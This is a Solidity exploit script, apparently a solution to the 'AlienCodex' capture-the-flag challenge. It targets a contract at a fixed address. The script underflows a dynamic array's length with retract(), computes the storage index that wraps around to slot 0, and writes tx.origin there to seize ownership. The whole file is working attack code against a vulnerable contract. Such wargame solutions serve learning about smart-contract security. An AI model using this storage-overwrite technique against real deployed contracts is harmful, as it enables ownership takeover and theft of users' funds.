// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../src/AlienCodex.sol";

contract Solve {
    function run() external {
        AlienCodex victim = AlienCodex(0xF1B48F80AfF22881Ca34F3766E6fB04d485aba9b);
        victim.makeContact();
        victim.retract();
        uint256 index = uint256(-1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        bytes32 data = bytes32(uint256(uint160(tx.origin)));
        victim.revise(index, data);
    }
}